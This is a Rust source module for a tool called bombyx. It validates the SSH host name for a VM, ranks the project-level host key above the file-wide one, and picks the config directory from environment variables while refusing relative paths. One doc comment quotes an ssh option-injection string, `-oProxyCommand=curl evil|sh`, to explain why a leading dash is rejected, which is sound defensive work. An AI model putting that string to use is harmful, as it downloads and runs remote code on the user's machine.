//! Where the VM host name comes from, and what shape it may take.
//!
//! Two keys in the operator's registry can name it: the project
//! entry's own `host`, and the file-wide one below it. The entry
//! wins, so one project can run on a machine of its own. An
//! operator writes `host` inside a project's table for exactly
//! that.
//!
//! `super::registry` reads the file; [`rank`] picks between the
//! two keys in a copy it is handed. Both keys have already been
//! checked by then: `super::registry`'s parse applies
//! [`refuse_if_bad`] to every `host` in the file as it reads it,
//! whether or not the run turns out to want that one, and its
//! header says why. So holding a `Registry` is the proof that
//! every host in it passed, and nothing downstream runs the
//! rule again.
//!
//! What is wrong with a host value is decided in one place,
//! [`host_problem`], so the message an operator gets does not
//! depend on which key carried the value.
//!
//! # Why the config directory is decided here
//!
//! [`user_config_dir`] answers where the registry file lives,
//! and it sits in this module because the host is what the
//! answer protects: a relative `BOMBYX_CONFIG_HOME` would take
//! the VM host out of whatever repository bombyx was run in,
//! which is the one thing this design removes.

use std::path::{Path, PathBuf};

use super::error::FieldError;
use super::registry::{self, USER_CONFIG_FILE};
use super::{ConfigError, guards};
use crate::name::ProjectName;

/// Characters allowed in an SSH destination.
///
/// Deliberately narrow: an alias from `~/.ssh/config`, or a
/// `user@host` spelling.
pub(crate) fn is_host_char(c: char) -> bool {
    c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-' | '@')
}

/// Environment variable relocating the per-developer config
/// directory.
///
/// Exists so a test -- or an operator keeping several setups
/// apart -- can point bombyx at a directory of its own instead
/// of the real one.
pub const CONFIG_DIR_ENV: &str = "BOMBYX_CONFIG_HOME";

/// What is wrong with a host value.
///
/// This type deliberately carries no field name.
/// [`FieldError`] does carry one, and for every other config
/// value that name answers the operator's question, "which key
/// do I edit?". For `host` it does not: the registry has a
/// `host` key per project and one more below them all, so the
/// field name identifies none of them. The useful answer is the
/// *source*, which [`refuse_if_bad`] takes as a [`HostOrigin`]
/// and attaches.
pub(crate) enum HostProblem {
    /// Blank, so no host at all.
    Empty,
    /// Present but outside the allowed shape.
    Invalid(String),
}

impl From<FieldError> for HostProblem {
    /// Drops the field name the guards attach.
    ///
    /// Every guard is written to name a field, because most
    /// callers want that. `host` is the exception, so the name
    /// is discarded here and the caller supplies the source
    /// instead.
    fn from(err: FieldError) -> Self {
        match err {
            FieldError::Empty { .. } => Self::Empty,
            FieldError::Invalid { reason, .. } => Self::Invalid(reason),
        }
    }
}

/// Checks a host value, whatever supplied it.
///
/// It applies three rules, and all three come from
/// `super::guards`, so widening one there widens it here too.
///
/// The leading-dash rule is the one worth spelling out. `host`
/// reaches `ssh` as its first positional argument, and `ssh`
/// does not honour a `--` end-of-options separator, so a
/// leading `-` is read as an option:
/// `-oProxyCommand=curl evil|sh` runs code on this workstation
/// from a bare `bombyx status`, before any network traffic.
pub(crate) fn host_problem(value: &str) -> Option<HostProblem> {
    guards::check_not_empty("host", value)
        .and_then(|()| guards::check_not_an_option("host", value, "ssh"))
        .and_then(|()| {
            guards::check_charset(
                "host",
                value,
                is_host_char,
                "letters, digits, `.`, `_`, `-` or `@`",
            )
        })
        .err()
        .map(HostProblem::from)
}

/// Refuses `value` if [`host_problem`] finds anything wrong,
/// naming its source rather than a field -- two keys, two
/// answers to "which line do I edit?".
///
/// # Errors
///
/// Returns [`ConfigError::InvalidHost`], naming the source and
/// the reason.
pub(crate) fn refuse_if_bad(
    value: &str,
    origin: &HostOrigin,
    path: Option<&Path>,
) -> Result<(), ConfigError> {
    let Some(problem) = host_problem(value) else {
        return Ok(());
    };
    Err(ConfigError::InvalidHost {
        origin: origin.describe(path),
        reason: match problem {
            // `HostProblem` carries no field name, so the empty
            // case has no reason attached and gets one here.
            HostProblem::Empty => "must not be empty".to_owned(),
            HostProblem::Invalid(reason) => reason,
        },
    })
}

/// Whether an environment-supplied directory is safe to use.
///
/// Requires an anchored path: a POSIX root, a Windows root, or a
/// drive *with* a separator. Rooted spellings are checked
/// directly rather than through [`Path::is_absolute`], which
/// answers per-platform -- `C:\x` is not absolute on Unix and
/// `/x` is not absolute on Windows, while this same code reads
/// the same environment on both.
///
/// `C:cfg` is refused along with `cfg`: a drive-relative path
/// resolves against that drive's current directory, which is not
/// a location the operator chose either.
pub fn is_anchored_dir(value: &str) -> bool {
    let value = value.trim();
    if value.starts_with('/') || value.starts_with('\\') {
        return true;
    }
    let bytes = value.as_bytes();
    bytes.len() >= 3
        && bytes[0].is_ascii_alphabetic()
        && bytes[1] == b':'
        && (bytes[2] == b'/' || bytes[2] == b'\\')
}

/// Returns the directory holding the per-developer config.
///
/// [`CONFIG_DIR_ENV`] wins when set. Otherwise this is
/// `%APPDATA%\bombyx` on Windows and
/// `$XDG_CONFIG_HOME/bombyx` -- or `$HOME/.config/bombyx` --
/// elsewhere. `None` when the environment names no home at
/// all, which is a machine bombyx cannot guess about.
///
/// Every value must be an *anchored* path; a blank or relative
/// one counts as unset and the next source is consulted. A
/// relative value would otherwise resolve against the working
/// directory, which on this tool means taking the VM host out of
/// whatever repo bombyx was run in.
#[must_use]
pub fn user_config_dir() -> Option<PathBuf> {
    config_dir_from(|key| std::env::var(key).ok(), cfg!(windows))
}

/// [`user_config_dir`] against an arbitrary environment.
///
/// `var` is split out so the precedence is testable without
/// mutating the process environment, which is global and would
/// make these tests race each other. `windows` is split out for
/// the same reason and gates `APPDATA`.
///
/// **`APPDATA` is consulted only when `windows`.** It is
/// routinely set in processes that are not Windows -- under WSL
/// via `WSLENV`, under Wine, in some CI images. Checking it
/// unconditionally would make a Linux run read a *Windows*
/// config directory in preference to `$HOME/.config`, silently
/// taking the host name from a file the docs say applies only to
/// Windows.
pub(crate) fn config_dir_from<F>(var: F, windows: bool) -> Option<PathBuf>
where
    F: Fn(&str) -> Option<String>,
{
    // A value that is blank *or not anchored* is treated as
    // unset, and the next source is consulted.
    //
    // Both spellings do the same damage. Set to "" by a launcher
    // script, the variable resolves to a relative
    // `bombyx/config.toml` in the working directory; set to a
    // non-blank relative value it resolves just as relatively --
    // `BOMBYX_CONFIG_HOME=.` reads `./config.toml`,
    // `XDG_CONFIG_HOME=.config` reads
    // `./.config/bombyx/config.toml`, and `..` walks out of the
    // tree. Either way the host name comes out of the repo,
    // which is the one thing this design removes.
    //
    // Such a value arrives from a per-directory environment
    // (`direnv`, a `mise.toml` in a clone, a CI job) or a plain
    // typo, and the host it supplies decides where `up` boots a
    // VM and where `destroy` runs `rm -rf`.
    let set = |key: &str| {
        var(key)
            .filter(|v| is_anchored_dir(v))
            .map(|v| v.trim().to_owned())
    };

    if let Some(dir) = set(CONFIG_DIR_ENV) {
        return Some(PathBuf::from(dir));
    }
    if windows {
        return set("APPDATA")
            .map(|appdata| Path::new(&appdata).join("bombyx"));
    }
    if let Some(xdg) = set("XDG_CONFIG_HOME") {
        return Some(Path::new(&xdg).join("bombyx"));
    }
    let home = set("HOME")?;
    Some(Path::new(&home).join(".config").join("bombyx"))
}

/// Which key supplied [`super::Config::host`].
///
/// Returned by [`super::Config::load_project`], so a caller can
/// *report* the winner instead of re-deriving it. A binary that
/// re-read the registry for itself would hold a second copy of
/// the precedence rule below, in code no library test can reach
/// -- so swapping the two keys here would leave its message
/// naming the wrong one.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum HostOrigin {
    /// One project's entry in the per-developer
    /// [`USER_CONFIG_FILE`].
    ///
    /// It carries the project name because the entry and the
    /// file-wide `host` sit in the same file: naming the file
    /// alone would leave the operator to work out which of the
    /// two won, and `destroy` runs `rm -rf` on the winner. The
    /// name is the map key as the file spells it, so it is the
    /// table heading to go and edit.
    ///
    /// Carrying it is why [`HostOrigin`] is not `Copy`.
    ProjectEntry(ProjectName),
    /// The file-wide `host` in the per-developer
    /// [`USER_CONFIG_FILE`].
    UserFile,
}

impl HostOrigin {
    /// Names this source, in the words every message and the
    /// startup notice print.
    ///
    /// `path` is the registry file when the caller knows where
    /// it is, and the bare file name stands in otherwise.
    /// `super::registry`'s own parse passes it, because an
    /// operator sent to fix a bad value has to find the file.
    ///
    /// The startup notice passes `None` and so prints the bare
    /// name, which is a gap rather than a decision: the
    /// directory comes from `BOMBYX_CONFIG_HOME`, `APPDATA`,
    /// `XDG_CONFIG_HOME` or `HOME`, and a per-directory
    /// environment tool can redirect the first of those from
    /// inside a clone -- so `config.toml` alone does not say
    /// whose file won. `config-home-env-provenance` in
    /// `docs/todo.md` tracks it, and covers two halves: printing
    /// the line for a file-wide `host` at all, and passing the
    /// path in here. Doing only the first leaves this rendering
    /// a directoryless literal.
    ///
    /// One function rather than two, so the notice and the error
    /// cannot come to describe the same source differently. The
    /// wording for a project entry names its table, and that
    /// spelling existing twice is how the two drift apart.
    pub(crate) fn describe(&self, path: Option<&Path>) -> String {
        let file = path.map_or_else(
            || USER_CONFIG_FILE.to_owned(),
            super::read::path_display,
        );
        let file = file.as_str();
        match self {
            Self::ProjectEntry(name) => {
                // `.host` sits outside the brackets, so the
                // heading and the key are separate here.
                let table = registry::heading(name.as_str(), "");
                format!("{table}.host in {file}")
            }
            Self::UserFile => file.to_owned(),
        }
    }
}

impl std::fmt::Display for HostOrigin {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.write_str(&self.describe(None))
    }
}

/// Picks between the two `host` keys the registry can carry.
///
/// The project entry's own `host` wins; the file-wide `host`
/// applies when the entry has none. One machine name written
/// once covers every project, and a project that runs elsewhere
/// says so in its own table.
///
/// `registry` is the file, already read. It is a parameter
/// rather than something this function opens because
/// `super::Config::load_project` needs the same file for the
/// project's other settings, and it must be the same *copy*: a
/// file edited between two reads could supply a project host and
/// a file-wide host that never coexisted.
///
/// Both values arrive checked, and `super::registry`'s parse is
/// what checked them. Nothing here runs the rule again.
///
/// # Errors
///
/// Returns [`ConfigError::HostMissing`] when neither key names a
/// host.
pub(crate) fn rank(
    registry: &registry::Registry,
    name: &str,
) -> Result<(String, HostOrigin), ConfigError> {
    if let Some((key, host)) = registry.project_host(name) {
        return Ok((host.to_owned(), HostOrigin::ProjectEntry(key.clone())));
    }
    if let Some(host) = registry.host() {
        return Ok((host.to_owned(), HostOrigin::UserFile));
    }
    Err(ConfigError::HostMissing {
        place: super::read::path_display(registry.path()),
    })
}

/// The registry file bombyx reads when `--config` names none.
///
/// [`user_config_dir`] decides the directory and
/// [`USER_CONFIG_FILE`] is the name inside it. `None` when the
/// environment names no config directory, which is a machine
/// bombyx cannot guess about.
#[must_use]
pub fn registry_file() -> Option<PathBuf> {
    user_config_dir().map(|dir| dir.join(USER_CONFIG_FILE))
}

/// Names the registry file, for an error message.
///
/// [`ConfigError::RegistryNotFound`] is what needs it, and it is
/// the one message about a file bombyx did not open. Every other
/// message asks the `Registry` for the path it was read from.
///
/// It is a path the operator can act on, so it is printed in
/// full rather than described. Only a machine whose environment
/// names no config directory at all gets the description, and
/// then there is no path to print.
pub(crate) fn registry_place(path: Option<&Path>) -> String {
    path.map_or_else(
        // No config directory in the environment, so there is
        // nothing concrete to point at.
        || format!("a {USER_CONFIG_FILE} in your config directory"),
        super::read::path_display,
    )
}
